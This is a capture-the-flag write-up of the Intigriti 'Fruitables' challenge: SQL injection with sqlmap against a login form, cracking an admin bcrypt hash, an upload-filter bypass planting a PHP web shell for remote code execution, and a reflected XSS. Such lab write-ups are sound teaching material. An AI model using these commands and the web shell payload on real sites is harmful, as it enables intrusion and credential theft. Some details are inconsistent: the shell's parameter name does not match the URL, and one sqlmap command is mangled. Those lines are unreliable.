# Fruitables [77 solves]
created by `Invincible`

## Description

> A website about fruit? Probably no vulnerabilities there.. Move along everybody!
> https://ctfd-status.ctf.intigriti.io/fruitables

## Flag

`INTIGRITI{fru174bl35_vuln3r4b1l17y_ch3ckm8}`

## Solution

When we visit the given website we land on a page which seems to be an online store for selling fruits

![initial webpage](image-1.png)

When clicking around in the website we find 4 endpoints:

```
https://fruitables-3.ctf.intigriti.io/shop.php
https://fruitables-3.ctf.intigriti.io/shop-detail.php
https://fruitables-3.ctf.intigriti.io/checkout.php
https://fruitables-3.ctf.intigriti.io/contact.php
```

Three directories do not appear to contain any functionality except for the checkout page which submits a `POST` request

![POST request](image-2.png)

Upon investigating this request further it does not appear to be vulnerable.

Moving on I decided to perform some directory bruteforcing. To my initial attack I added .php extension because the website is using PHP (this conclusion was made because endpoints that we found contains .php extension)

Command:
```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -u https://fruitables-3.ctf.intigriti.io/FUZZ -e .php
```

Output:
![output of ffuf](image-3.png)

In the output we see some interesting directories and endpoints. One of the endpoints is `account.php`

![account.php](image-4.png)

After trying to register the account we get an error `Sorry, registration is currently closed!` and we are being thrown into a new endpoint 
https://fruitables-3.ctf.intigriti.io/auth/fruitables_login.php

![login page](image-5.png)

After uncussesful login while trying to use some common credintials I tried some common attacks such as SSTI (Server Side Template Injection) or SQLI (SQL Injection). Surprizingly, upon submitting a backtick ' character an SQL error page shows up indicating that the website might be vulnerable to SQL injection
![SQL error](image-6.png)

We confirm the SQL injection using `sqlmap` tool

Command:
```bash
sqlmap -u "https://fruitables-3.ctf.intigriti.io:443/auth/fruitables_login.php" --data="username=test&password=sick" --technique=E --batch
```

Output:
![SQLI](image-7.png)

Upon confirming that the website is indeed vulnerable to error based SQLI I listed all databses and tables from the SQL databse. One table stood out which was `users` table in `users` database so I extracted it and got some usernames and hashes

Command:
```bash
sqlmap -u "https://fruitables-3.ctf.intigriti.io:443/auth/fruitables_login.php" --data="username=test&password=sick" --batch -T [60/373]
dump
```

Output:
![users and hashes](image-8.png)

After getting the hashes I picked to crack the administrator which seemed like it was the most valuable hash. Its type was `bcrypt` 

Command:
```bash
hashcat -a 0 hashes/hashes.txt rockyou.txt -m 3200 --show
```

Luckily, almost immediatly the hash cracks and the password is `futurama`

Now we have a valid username and password: `tjfry_admin:futurama`

After logging in to the website we see that there is a file upload functionality and after trying to upload a `.txt` file a message shows up stating that we can only upload JPEG and PNG files
![upload](image-9.png) 


After that I tried attacking the application by uploading a php file and masking it as much as possible so hopefully application accepts the file:

* Uploaded a normal PNG and intercepted the request with BurpSuite
* Added `.php` extension to the filename
* Content type is set to `image/png`
* Deleted most part of the image's content and only kept PNG's magic bytes which hexadecimal values are `89 50 4E 47 0D 0A 1A 0A`
* Added a PHP code which would allow me to execute commands on the website:

```php
<?php
system($_GET['cmd']);
?>
```

* Finally I sent the request and our PHP script has uploaded successfuly!
![uploaded PHP](image-10.png)

After uploading the PHP we can test it by going to the directory that we discovered earlier `uploads` and pasting in the file name with parameter `intigriti` and our command

Command:
```
https://fruitables-3.ctf.intigriti.io/uploads/56dd93fffc446be30e6735535081686f.png.php?intigriti=id
```

Output:
![RCE](image-11.png)

Great! Now we have remote code execution and by looking around we find that the flag is stored in `/flag_poxm7AQwN77Lj2PU.txt`
![flag](image-12.png)

> INTIGRITI{fru174bl35_vuln3r4b1l17y_ch3ckm8}

### BONUS

When trying to register an account we are being redirected to the page

https://fruitables-3.ctf.intigriti.io/auth/fruitables_login.php?error=Sorry%2C+registration+is+currently+closed%21

Upon realizing that the error code is being displayed on the website, I tried changing the error to something else and it worked!
![intigriti](image-13.png)

After trying some attacks I found that the website is vulnerable to XSS (Cross Site Scripting) attack which could have been exploited if there were any other functionality
![XSS](image-14.png)

> Written by NitrogenXP